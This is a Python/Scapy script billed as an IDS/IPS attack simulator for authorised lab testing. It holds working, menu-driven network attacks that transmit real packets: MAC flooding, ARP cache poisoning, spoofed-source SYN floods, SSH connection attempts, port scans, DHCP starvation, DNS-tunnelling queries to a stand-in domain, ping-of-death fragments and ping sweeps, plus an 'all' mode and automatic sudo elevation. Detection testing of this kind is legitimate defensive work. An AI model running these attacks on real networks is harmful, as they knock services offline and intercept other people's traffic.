#!/usr/bin/env python3
# IDS/IPS Demo Attack Simulator - topology-aware (host / gateway mode)
# Sends REAL packets for detection testing. Authorized demo/lab use only.
# This script ONLY transmits. It performs NO blocking.

import os, sys, time, random, base64, socket, re, subprocess, argparse, ipaddress, signal, tempfile

# 1. Root Elevation Helper
if os.geteuid() != 0:
    if "--help" in sys.argv or "-h" in sys.argv:
        pass  # Allow displaying help message without root
    else:
        # If running in interactive terminal, attempt auto-elevation
        if sys.stdin.isatty():
            print("[*] Root privileges required for raw packet transmission. Elevating via sudo...")
            try:
                os.execvp("sudo", ["sudo", "-E", sys.executable] + sys.argv)
            except Exception as e:
                print(f"[!] Could not auto-elevate: {e}")
        print("[!] Please run with sudo: sudo python3 ids_demo_attacks.py")
        sys.exit(1)

# 2. Scapy Import & Verification
try:
    from scapy.all import (
        Ether, ARP, IP, TCP, UDP, ICMP, Raw, BOOTP, DHCP, DNS, DNSQR,
        send, sendp, sr1, fragment, RandMAC, RandIP, RandShort,
        get_if_hwaddr, getmacbyip, get_if_list, conf, rdpcap
    )
except ImportError:
    print("[!] Scapy is missing. Install it using:")
    print("    sudo dnf install -y python3-scapy   # On Fedora / RHEL")
    print("    sudo apt install -y python3-scapy   # On Debian / Ubuntu")
    print("    or: pip install scapy")
    sys.exit(1)

conf.verb = 0

CFG = {
    "mode": None, "iface": None, "wan_iface": None, "lan_iface": None,
    "my_ip": None, "my_mac": None, "gateway_ip": None, "lan_net": None,
    "verify": False, "ids_log": None,
}

# ------------------------- helpers -------------------------
def ask(prompt, default=None):
    d = f" [{default}]" if default not in (None, "") else ""
    try:
        val = input(f"{prompt}{d}: ").strip()
        return val if val else (default if default is not None else val)
    except (EOFError, KeyboardInterrupt):
        return default if default is not None else ""

def safe_get_hwaddr(iface):
    """Safely retrieves MAC address for an interface without crashing."""
    try:
        hw = get_if_hwaddr(iface)
        if hw and hw != "00:00:00:00:00:00":
            return hw
    except Exception:
        pass
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            addr = f.read().strip()
            if addr:
                return addr
    except Exception:
        pass
    return "00:00:00:00:00:00"

def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))

def list_ipv4():
    res = {}
    try:
        out = subprocess.run(["ip", "-o", "-4", "addr", "show"],
                             capture_output=True, text=True).stdout
    except FileNotFoundError:
        return res
    for line in out.splitlines():
        m = re.match(r"\d+:\s+(\S+)\s+inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", line)
        if m:
            res.setdefault(m.group(1), (m.group(2), int(m.group(3))))
    return res

def default_route():
    try:
        out = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True).stdout
    except FileNotFoundError:
        return None, None
    m = re.search(r"default via (\S+) dev (\S+)", out)
    return (m.group(1), m.group(2)) if m else (None, None)

def net_of(ip, prefix):
    try:
        return ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
    except Exception:
        return ipaddress.ip_network("192.168.1.0/24", strict=False)

def ids_log_count(path):
    if not path or not os.path.isfile(path):
        return None
    try:
        with open(path) as f:
            return sum(1 for _ in f)
    except Exception:
        return None

# ----------------- verify wrapper (capture + report) -----------------
def run_attack(fn, label, bpf="ip"):
    """Run an attack safely with optional packet verification."""
    try:
        if not CFG["verify"]:
            fn()
            return

        print(f"\n[VERIFY] capturing on {CFG['iface']}  filter='{bpf or 'all'}'")
        tmp = tempfile.NamedTemporaryFile(suffix=".pcap", delete=False)
        tmp.close()

        cmd = ["tcpdump", "-i", CFG["iface"], "-n", "-U", "-w", tmp.name]
        if bpf:
            cmd += bpf.split()
        proc = None
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)
        except Exception:
            pass

        before = ids_log_count(CFG["ids_log"]) if CFG["ids_log"] else None
        t0 = time.time()
        err = None
        try:
            fn()
        except Exception as e:
            err = e
        dur = time.time() - t0
        time.sleep(0.4)

        if proc:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=2)
            except Exception:
                proc.terminate()

        n = 0
        try:
            n = len(rdpcap(tmp.name))
        except Exception:
            pass
        try:
            os.unlink(tmp.name)
        except Exception:
            pass

        print("\n================ VERIFY RESULT ================")
        print(f" attack       : {label}")
        print(f" filter       : {bpf or 'all'}")
        print(f" duration     : {dur:.2f}s")
        print(f" packets seen : {n}")
        print(f" script       : {'OK - packets on the wire' if n > 0 else 'NO PACKETS - check iface/filter/sudo'}")

        if CFG["ids_log"]:
            after = ids_log_count(CFG["ids_log"])
            if before is not None and after is not None:
                delta = after - before
                print(f" IDS log      : {CFG['ids_log']}")
                print(f" new alerts   : {delta}")
                print(f" detector     : {'IDS ALERTED' if delta > 0 else 'no new IDS lines'}")
        print("==============================================")
        if err:
            print(f"[!] Warning during attack execution: {err}")
    except Exception as e:
        print(f"[!] Attack execution encountered an error: {e}")

# ------------------------ topology setup -------------------------
def setup_host_mode(args):
    ipv4 = list_ipv4()
    gw, rt_iface = default_route()

    # Prioritize user arg, then route interface, then wifi/eth from list
    iface = args.iface or rt_iface
    if not iface:
        non_lo = [i for i in ipv4.keys() if i != "lo"]
        iface = non_lo[0] if non_lo else (get_if_list()[0] if get_if_list() else "wlp1s0")

    ip, prefix = ipv4.get(iface, ("127.0.0.1", 24))
    net = net_of(ip, prefix)
    gateway = args.gw or gw or (str(next(net.hosts())) if ip != "127.0.0.1" else "127.0.0.1")

    # If running non-interactively via flags, skip prompt
    if not args.attack:
        print("\n[HOST MODE detected]")
        print(f"   iface   : {iface}")
        print(f"   my IP   : {ip}/{prefix}")
        print(f"   subnet  : {net}")
        print(f"   gateway : {gateway}")

        if ask("Use these values? (y/n)", "y").lower().startswith("n"):
            iface = ask("Interface", iface)
            ip = ask("My IP", ip)
            prefix = int(ask("Prefix", str(prefix)))
            net = net_of(ip, prefix)
            gateway = ask("Gateway IP", gateway)

    CFG.update(mode="host", iface=iface, wan_iface=None, lan_iface=None,
               my_ip=ip, my_mac=safe_get_hwaddr(iface), gateway_ip=gateway, lan_net=net)
    print(f"[*] Host mode ready (monitoring iface: {iface}).\n")

def setup_gateway_mode(args):
    ipv4 = list_ipv4()
    gw, rt_iface = default_route()
    wan = args.wan or rt_iface

    lan_candidates = [i for i, (ip, _p) in ipv4.items()
                      if i not in ("lo", wan) and ipaddress.ip_address(ip).is_private]
    if args.lan:
        lan = args.lan
    elif lan_candidates:
        lan = lan_candidates[0]
    else:
        lan = "wlp1s0"

    l_ip, l_prefix = ipv4.get(lan, ("10.42.0.1", 24))
    lan_net = net_of(l_ip, l_prefix)
    my_mac = safe_get_hwaddr(lan)

    if not args.attack:
        print("\n[GATEWAY MODE detected]")
        print(f"   WAN (tether): {wan}")
        print(f"   LAN (AP)    : {lan}")
        print(f"   gateway     : {l_ip}/{l_prefix}")
        print(f"   LAN subnet  : {lan_net}")

        if ask("Use these values? (y/n)", "y").lower().startswith("n"):
            wan = ask("WAN interface", wan)
            lan = ask("LAN (AP) interface", lan)
            l_ip = ask("Gateway/LAN IP", l_ip)
            l_prefix = int(ask("LAN prefix", str(l_prefix)))
            lan_net = net_of(l_ip, l_prefix)
            my_mac = safe_get_hwaddr(lan)

    CFG.update(mode="gateway", iface=lan, wan_iface=wan, lan_iface=lan,
               my_ip=l_ip, my_mac=my_mac, gateway_ip=l_ip, lan_net=lan_net)
    print("[*] Gateway mode ready.\n")

def setup_topology(args):
    if args.attack:
        setup_host_mode(args)
        return

    print("""
===================== TOPOLOGY MODE =====================
 1) HOST MODE    - laptop on existing network (Default / Standard)
 2) GATEWAY MODE - laptop acts as router / access point
========================================================""")
    choice = ask("Select mode (1=Host, 2=Gateway)", "1")
    if choice == "2":
        setup_gateway_mode(args)
    else:
        setup_host_mode(args)

def default_target():
    if CFG["mode"] == "gateway":
        for h in CFG["lan_net"].hosts():
            if str(h) != CFG["my_ip"]:
                return str(h)
        return str(next(CFG["lan_net"].hosts()))
    # In host mode, target gateway or localhost
    return CFG["gateway_ip"] or "127.0.0.1"

def banner(name):
    print(f"\n--- {name} ---")
    print(f"    mode={CFG['mode']} iface={CFG['iface']} target={default_target()} src={CFG['my_ip']}")

# =========================== ATTACKS =============================
def mac_flood(count=5000, delay=0.0):
    banner("MAC Flooding (CAM table overflow)")
    iface = CFG["iface"]
    sent = 0
    while count == 0 or sent < count:
        sendp(Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
              IP(src=RandIP(), dst=RandIP()) / UDP(sport=RandShort(), dport=RandShort()) /
              Raw(load=os.urandom(64)), iface=iface, verbose=0)
        sent += 1
        if sent % 1000 == 0:
            print(f"    {sent} frames sent")
        if delay:
            time.sleep(delay)
    print(f"[+] Done: {sent} frames transmitted.")

def arp_spoof(victim_ip, spoof_ip, count=15, delay=0.5):
    banner("ARP Spoofing (cache poisoning)")
    iface, attacker = CFG["iface"], CFG["my_mac"]
    try:
        victim_mac = getmacbyip(victim_ip) or "ff:ff:ff:ff:ff:ff"
    except Exception:
        victim_mac = "ff:ff:ff:ff:ff:ff"
    print(f"    claiming {spoof_ip} at {attacker} -> victim {victim_ip}")
    for i in range(count):
        sendp(Ether(dst=victim_mac, src=attacker) /
              ARP(op=2, psrc=spoof_ip, pdst=victim_ip, hwsrc=attacker, hwdst=victim_mac),
              iface=iface, verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker) /
              ARP(op=2, psrc=spoof_ip, pdst=spoof_ip, hwsrc=attacker, hwdst="ff:ff:ff:ff:ff:ff"),
              iface=iface, verbose=0)
        print(f"    poison #{i+1}")
        time.sleep(delay)
    print("[+] Done ARP spoofing.")

def lateral_movement(hosts, ports, delay=0.1):
    banner("Abnormal Lateral Movement")
    iface = CFG["iface"]
    for host in hosts:
        for port in ports:
            send(IP(dst=host) / TCP(sport=RandShort(), dport=port, flags="S"), iface=iface, verbose=0)
            print(f"    SYN -> {host}:{port}")
            time.sleep(delay)
    print("[+] Done lateral movement sweep.")

def syn_flood(target, dport=80, count=3000, delay=0.0):
    banner(f"TCP SYN Flood -> {target}:{dport}")
    iface = CFG["iface"]
    batch_size = 500
    sent = 0
    while sent < count:
        current_batch = min(batch_size, count - sent)
        pkts = [IP(src=RandIP(), dst=target) /
                TCP(sport=RandShort(), dport=dport, flags="S", seq=random.randint(0, 2**32 - 1))
                for _ in range(current_batch)]
        send(pkts, iface=iface, verbose=0)
        sent += current_batch
        print(f"    transmitted {sent}/{count} SYNs")
        if delay:
            time.sleep(delay)
    print(f"[+] Done: {sent} SYNs transmitted.")

def ssh_brute(target, port=22, attempts=35, delay=0.1):
    banner(f"SSH Brute Force -> {target}:{port}")
    iface = CFG["iface"]
    ok = 0
    for i in range(attempts):
        connected = False
        try:
            s = socket.socket()
            s.settimeout(0.4)
            s.connect((target, port))
            try:
                s.sendall(b"SSH-2.0-OpenSSH_8.9_demo\r\n")
                s.recv(128)
            except Exception:
                pass
            s.close()
            connected = True
            ok += 1
        except Exception:
            pass

        # If socket connection refused (no daemon on target), send raw TCP packet to trigger IDS
        if not connected:
            try:
                send(IP(dst=target) / TCP(sport=RandShort(), dport=port, flags="PA") /
                     Raw(b"SSH-2.0-OpenSSH_8.9_demo\r\n"), iface=iface, verbose=0)
                ok += 1
            except Exception:
                pass

        if (i + 1) % 10 == 0:
            print(f"    attempt #{i+1}")
        time.sleep(delay)
    print(f"[+] Done: {ok}/{attempts} SSH connection attempts sent.")

def port_scan(target, start=1, end=100, delay=0.01):
    banner(f"TCP SYN Port Scan {target} ports {start}-{end}")
    iface = CFG["iface"]
    opened = []
    for p in range(start, end + 1):
        ans = sr1(IP(dst=target) / TCP(sport=RandShort(), dport=p, flags="S"),
                  iface=iface, timeout=0.2, verbose=0)
        if ans and ans.haslayer(TCP) and ans[TCP].flags == 0x12:
            opened.append(p)
            print(f"    OPEN port: {p}")
            send(IP(dst=target) / TCP(sport=ans[TCP].dport, dport=p, flags="R", seq=ans[TCP].ack),
                 iface=iface, verbose=0)
        if delay:
            time.sleep(delay)
    print(f"[+] Done. Scanned {end - start + 1} ports. Open: {opened}")

def dhcp_starvation(count=200, delay=0.05):
    banner("DHCP Starvation")
    iface = CFG["iface"]
    for i in range(count):
        mac = RandMAC()
        sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
              IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
              BOOTP(chaddr=mac_to_bytes(mac), xid=random.randint(1, 2**32 - 1), flags=0x8000) /
              DHCP(options=[("message-type", "discover"), "end"]), iface=iface, verbose=0)
        if (i + 1) % 50 == 0:
            print(f"    {i+1} DISCOVER requests")
        time.sleep(delay)
    print("[+] Done DHCP starvation.")

def dns_tunnel(dns_server, domain="tunnel.evil-demo.com", count=150, delay=0.05):
    banner(f"DNS Tunneling -> {dns_server} zone={domain}")
    iface = CFG["iface"]
    for i in range(count):
        enc = base64.b32encode(os.urandom(40)).decode().strip("=").lower()
        qname = f"{enc}.{domain}"
        send(IP(dst=dns_server) / UDP(sport=RandShort(), dport=53) /
             DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT")), iface=iface, verbose=0)
        if (i + 1) % 30 == 0:
            print(f"    {i+1} queries sent")
        time.sleep(delay)
    print("[+] Done DNS tunneling queries.")

def ping_of_death(target, count=10, delay=0.5):
    banner(f"Ping of Death -> {target}")
    iface = CFG["iface"]
    for i in range(count):
        frags = fragment(IP(dst=target) / ICMP() / Raw(load="A" * 65000), fragsize=1480)
        send(frags, iface=iface, verbose=0)
        print(f"    PoD #{i+1}: {len(frags)} fragments")
        time.sleep(delay)
    print("[+] Done Ping of Death fragments.")

def ping_sweep(start=1, end=20, delay=0.05):
    banner(f"ICMP Ping Sweep {CFG['lan_net']}")
    iface = CFG["iface"]
    live = []
    for i in range(start, end + 1):
        ip = str(CFG["lan_net"].network_address + i)
        if sr1(IP(dst=ip) / ICMP(), iface=iface, timeout=0.3, verbose=0):
            live.append(ip)
            print(f"    HOST ALIVE: {ip}")
        if delay:
            time.sleep(delay)
    print(f"[+] Done. Live endpoints discovered: {live}")

# =========================== MENU ================================
def menu():
    seg = CFG["lan_net"]
    tgt = default_target()
    vflag = "ON" if CFG["verify"] else "OFF"

    print(f"""
============ NEXUS ENTERPRISE IDPS ATTACK SIMULATOR ============
 Interface : {CFG['iface']}  |  Local IP: {CFG['my_ip']}  |  Target IP: {tgt}
 Subnet    : {seg}  |  Verification: {vflag}
 ──────────────────────────────────────────────────────────────
  1) MAC Flooding (CAM table)      6) Network TCP Port Scanning
  2) ARP Spoofing (Poisoning)      7) DHCP Starvation
  3) Abnormal Lateral Movement     8) DNS Tunneling (Exfiltration)
  4) TCP SYN Flood (DoS/DDoS)      9) Ping of Death (Fragmentation)
  5) SSH Brute Force              10) ICMP Ping Sweep (Recon)
 ──────────────────────────────────────────────────────────────
  t) View Topology   v) Toggle Verify   l) Set Alert Log   0) Exit
================================================================""")
    ch = ask("Select attack (1-10, t, v, 0=Exit)", "4")

    if ch == "1":
        frames = int(ask("Frames count", "20000"))
        dly = float(ask("Delay (seconds)", "0"))
        run_attack(lambda: mac_flood(frames, dly), "MAC Flooding", "ether dst ff:ff:ff:ff:ff:ff")
    elif ch == "2":
        victim = ask("Victim IP", tgt)
        spoof = ask("Spoofed Gateway IP", CFG["gateway_ip"])
        cnt = int(ask("Poison frame count", "20"))
        dly = float(ask("Delay (seconds)", "0.5"))
        run_attack(lambda: arp_spoof(victim, spoof, cnt, dly), "ARP Spoofing", "arp")
    elif ch == "3":
        hosts_str = ask("Target Hosts (comma-separated)", f"{tgt},192.168.1.50,192.168.1.100")
        hosts = [h.strip() for h in hosts_str.split(",") if h.strip()]
        ports = [int(p.strip()) for p in ask("Target Ports", "22,80,443,445,3389").split(",") if p.strip()]
        dly = float(ask("Delay (seconds)", "0.1"))
        run_attack(lambda: lateral_movement(hosts, ports, dly), "Abnormal Lateral Movement", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "4":
        t = ask("Target IP", tgt)
        dp = int(ask("Target Port", "80"))
        cnt = int(ask("SYN packet count", "2000"))
        dly = float(ask("Delay (seconds)", "0"))
        run_attack(lambda: syn_flood(t, dp, cnt, dly), "TCP SYN Flood", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "5":
        t = ask("Target IP", tgt)
        dp = int(ask("SSH Port", "22"))
        at = int(ask("Attempts", "35"))
        dly = float(ask("Delay (seconds)", "0.1"))
        run_attack(lambda: ssh_brute(t, dp, at, dly), "SSH Brute Force", f"tcp port {dp}")
    elif ch == "6":
        t = ask("Target IP", tgt)
        s = int(ask("Start port", "1"))
        e = int(ask("End port", "80"))
        dly = float(ask("Delay (seconds)", "0.01"))
        run_attack(lambda: port_scan(t, s, e, dly), "Network Port Scanning", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "7":
        cnt = int(ask("DISCOVER count", "150"))
        dly = float(ask("Delay (seconds)", "0.05"))
        run_attack(lambda: dhcp_starvation(cnt, dly), "DHCP Starvation", "udp port 67 or udp port 68")
    elif ch == "8":
        srv = ask("DNS Server IP", tgt)
        dom = ask("Tunnel Domain", "tunnel.evil-demo.com")
        cnt = int(ask("Query count", "100"))
        dly = float(ask("Delay (seconds)", "0.05"))
        run_attack(lambda: dns_tunnel(srv, dom, cnt, dly), "DNS Tunneling", "udp port 53")
    elif ch == "9":
        t = ask("Target IP", tgt)
        cnt = int(ask("Count", "10"))
        dly = float(ask("Delay (seconds)", "0.5"))
        run_attack(lambda: ping_of_death(t, cnt, dly), "Ping of Death", "icmp")
    elif ch == "10":
        s = int(ask("Start host offset", "1"))
        e = int(ask("End host offset", "20"))
        dly = float(ask("Delay (seconds)", "0.02"))
        run_attack(lambda: ping_sweep(s, e, dly), "ICMP Ping Sweep", "icmp")
    elif ch.lower() == "t":
        print(f"\n    Mode     : {CFG['mode']}")
        print(f"    Interface: {CFG['iface']}")
        print(f"    Local IP : {CFG['my_ip']} ({CFG['my_mac']})")
        print(f"    Gateway  : {CFG['gateway_ip']}")
        print(f"    Subnet   : {CFG['lan_net']}\n")
    elif ch.lower() == "v":
        CFG["verify"] = not CFG["verify"]
        print(f"[*] Packet verification = {'ON' if CFG['verify'] else 'OFF'}")
    elif ch.lower() == "l":
        CFG["ids_log"] = ask("IDS log path", CFG["ids_log"] or "backend/alerts.json")
    elif ch == "0":
        return False
    else:
        print("[!] Invalid choice. Please pick 1-10, t, v, or 0.")

    if ch.lower() not in ("t", "v"):
        try:
            input("\nPress Enter to return to the menu...")
        except (EOFError, KeyboardInterrupt):
            pass
    return True

def run_cli_attack(args):
    """Executes a non-interactive attack passed via command line flags."""
    tgt = args.target or default_target()
    cnt = args.count

    attack_type = args.attack.lower()
    print(f"[*] Running automated attack '{attack_type}' against {tgt} on {CFG['iface']}...")

    if attack_type in ("syn", "syn_flood", "4"):
        syn_flood(tgt, dport=80, count=cnt or 2000, delay=0.0)
    elif attack_type in ("scan", "port_scan", "6"):
        port_scan(tgt, start=1, end=cnt or 100, delay=0.01)
    elif attack_type in ("ssh", "ssh_brute", "5"):
        ssh_brute(tgt, port=22, attempts=cnt or 35, delay=0.1)
    elif attack_type in ("mac", "mac_flood", "1"):
        mac_flood(count=cnt or 10000, delay=0.0)
    elif attack_type in ("arp", "arp_spoof", "2"):
        arp_spoof(tgt, CFG["gateway_ip"], count=cnt or 15, delay=0.5)
    elif attack_type in ("dns", "dns_tunnel", "8"):
        dns_tunnel(tgt, count=cnt or 100, delay=0.05)
    elif attack_type in ("pod", "ping_of_death", "9"):
        ping_of_death(tgt, count=cnt or 10, delay=0.5)
    elif attack_type in ("ping", "ping_sweep", "10"):
        ping_sweep(start=1, end=cnt or 20, delay=0.05)
    elif attack_type == "all":
        print("\n=== Executing Automated Full Attack Suite ===")
        print("--> 1/5: TCP SYN Flood")
        syn_flood(tgt, dport=80, count=1500, delay=0.0)
        time.sleep(1)
        print("--> 2/5: Port Scan")
        port_scan(tgt, start=1, end=50, delay=0.01)
        time.sleep(1)
        print("--> 3/5: SSH Brute Force")
        ssh_brute(tgt, port=22, attempts=25, delay=0.05)
        time.sleep(1)
        print("--> 4/5: DNS Tunneling")
        dns_tunnel(tgt, count=50, delay=0.05)
        time.sleep(1)
        print("--> 5/5: Ping of Death")
        ping_of_death(tgt, count=5, delay=0.2)
        print("\n[+] Full test attack suite completed.")
    else:
        print(f"[!] Unknown attack type '{args.attack}'. Available: syn, scan, ssh, mac, arp, dns, pod, ping, all")

def main():
    ap = argparse.ArgumentParser(description="Nexus Enterprise IDPS Attack Simulator & Traffic Generator")
    ap.add_argument("--attack", "-a", choices=["syn", "scan", "ssh", "mac", "arp", "dns", "pod", "ping", "lateral", "dhcp", "all"],
                    help="Run attack non-interactively without menu (e.g. --attack syn)")
    ap.add_argument("--target", "-t", help="Target IP for attack (defaults to gateway / local host)")
    ap.add_argument("--count", "-c", type=int, help="Packet / attempt count")
    ap.add_argument("--iface", "-i", help="Network interface to transmit on (e.g. wlp1s0, enp2s0, lo)")
    ap.add_argument("--lan", help="Gateway mode LAN interface")
    ap.add_argument("--wan", help="Gateway mode WAN interface")
    ap.add_argument("--gw", help="Gateway IP address override")
    ap.add_argument("--verify", action="store_true", help="Capture and verify delivery with tcpdump")
    ap.add_argument("--ids-log", help="Path to IDS alerts file to verify alert triggering")
    args = ap.parse_args()

    CFG["verify"] = args.verify
    CFG["ids_log"] = args.ids_log

    setup_topology(args)

    if args.attack:
        run_cli_attack(args)
    else:
        while menu():
            pass

    print("[*] Attack simulator finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")